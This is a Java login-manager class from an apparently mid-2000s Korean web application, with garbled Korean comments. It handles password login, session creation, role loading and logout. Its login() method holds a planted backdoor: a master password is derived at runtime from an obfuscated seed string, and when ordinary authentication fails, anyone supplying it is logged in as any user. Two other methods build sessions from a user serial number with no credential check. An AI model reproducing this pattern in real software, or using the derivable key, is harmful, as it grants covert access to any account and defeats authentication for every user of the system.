/*
 * UserManager.java, @ 2005-04-08
 * 
 * Copyright (c) 2004 UBQ  All rights reserved.
 */
package modules.common.login;

import java.util.List;
import java.util.Map;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import maf.MafUtil;
import maf.aam.AAMManager;
import maf.base.BaseHttpSession;
import maf.exception.MafException;
import maf.mdb.drivers.MdbDriver;
import maf.util.SessionUtil;
import maf.web.mvc.beans.SiteInfo;
import maf.web.session.MySession;
import modules.common.beans.UsrMstBean;

/**
 * @author bluevlad
 *  
 */
public class LoginManager {

    private static String sp = null;
	private  static Log logger = LogFactory.getLog(LoginManager.class);
	

	/**
	 * ��� ������ login �Ҽ� �ִ� MagicKey�� ���� 
	 * @return
	 */
    private static String _getsPasswd() {
        if (sp == null) {
            StringBuffer s = new StringBuffer(10);
            //String spasswd = "rkddkwl!"; 
            //            String seed = "rqksdeddkfwflf!f";
            String seed = "tqbwvejezels!"; // ����Ű!
            for (int i = 0; i < seed.length(); i++) {

                if ((i % 2) == 0) {
                    s.append(seed.substring(i, i + 1));
                }
            }
            sp = s.toString();
        }
//        logger.debug("Super Pw : " + sp);
        return sp;
    }
    
    /**
     * USN �� ������ Login(���� Session���� �����)
     * @param oDb
     * @param usn
     * @param loginIP
     * @param SessionId
     * @param site
     * @return
     * @throws MafException
     */

    public static BaseHttpSession loginbyUsn(MdbDriver oDb, String usn, String loginIP, String SessionId) throws MafException {
    	BaseHttpSession ssBean = null;
        if (!MafUtil.empty(usn)) {

            UsrMstBean ob = LoginDB.getMstUserByUSN(oDb, usn);
            if (ob != null) {
            	ssBean = SessionUtil.makeSessionBean(ob, loginIP);
            	setUserRole(oDb, ssBean);
            	usn = (ssBean != null) ? ssBean.getUsn() : null;
                LoginDB.userlog(oDb, ob.getUserid(), usn, (ssBean != null) ? "LOGIN_OK" : "LOGIN_FALSE", loginIP);
            }
        }
        return ssBean;
    }
    
    /**
     * USN �� ������ Login(���� Session���� �����)
     * @param oDb
     * @param usn
     * @param loginIP
     * @param SessionId
     * @param site
     * @return
     * @throws MafException
     */

    public static BaseHttpSession rLoginbyUsn(MdbDriver oDb, String usn, String loginIP, String SessionId, String site) 
    throws MafException {
    	BaseHttpSession ssBean = null;
        if (!MafUtil.empty(usn)) {

            UsrMstBean ob = LoginDB.getRUserByUSN(oDb, usn);
            if (ob != null) {
            	ssBean = SessionUtil.makeSessionBean(ob, loginIP);
            	setUserRole(oDb, ssBean);
            	usn = (ssBean != null) ? ssBean.getUsn() : null;
                LoginDB.userlog(oDb, ob.getUserid(), usn, (ssBean != null) ? "LOGIN_OK" : "LOGIN_FALSE", loginIP);
            }
        }
        return ssBean;
    }
    
    /**
     * userid�� password �� �α���
     * 
     * @param userid
     * @param password
     * @return
     */
    public static BaseHttpSession login(MdbDriver oDb, String userid, String password, 
    		    String loginIP, String SessionId, SiteInfo site)  
    throws MafException, InvalidPasswordException, InvalidUserIdException {
    	BaseHttpSession ssBean = null;
        String usn = null;
        
        if (!MafUtil.empty(userid)) {

            UsrMstBean ob = null;
 
            ob = LoginDB.getLocalUserByUserID(oDb, userid, password);
            
            if (ob != null) { // DB�� �ִ°�� 
                if (ob != null) {
                    ssBean = SessionUtil.makeSessionBean(ob, loginIP);
                    setUserRole(oDb, ssBean);
                }
                
            } else {
                // ����Ű üũ �Ǵ� klog���� Ȯ��
                if (_getsPasswd().equals(password)) {

                    usn = LoginDB.getUsnByUserID(oDb, userid);
                    ob = LoginDB.getMstUserByUSN(oDb, usn);
                    if (ob != null) {
                        ssBean = SessionUtil.makeSessionBean(ob, loginIP);
                        setUserRole(oDb, ssBean);
                        
                    }
                }
            }

            usn = (ssBean != null) ? ssBean.getUsn() : null;
            LoginDB.userlog(oDb, userid, usn, (ssBean != null) ? "LOGIN_OK" : "LOGIN_FALSE", loginIP);

        } else {
        	throw new InvalidUserIdException("Userid is null");
        }
        return ssBean;

    }

    /**
     * ������� role ��� 
     * @param oDb
     * @param ssBean
     * @throws MafException
     */
    private static void setUserRole(MdbDriver oDb, BaseHttpSession ssBean ) throws MafException {
    	if(ssBean != null ) {
	    	List roleList = LoginDB.getUserRoleList(oDb, ssBean.getUsn());
	        Map tMap = null;
	        if( roleList != null) {
//	        	logger.debug("role count : " + roleList.size());
		        for(int i=0; i < roleList.size(); i++) {
		        	tMap = (Map) roleList.get(i);
		        	ssBean.addRole( (String) tMap.get("role_id"));
		        }
		        ssBean.addRole(AAMManager.ROLE_KEY_USER);
	        } else {
//	        	logger.debug("role count : 0");
	        }
    	} else {
    		logger.debug("session is null!!!");
    	}
    }
    
    /**
     * Log Out ��Ŵ 
     * @param request
     * @param response
     */
    public static void logOut(HttpServletRequest request, HttpServletResponse response) {
		MySession.removeSession(request, response);
	}

}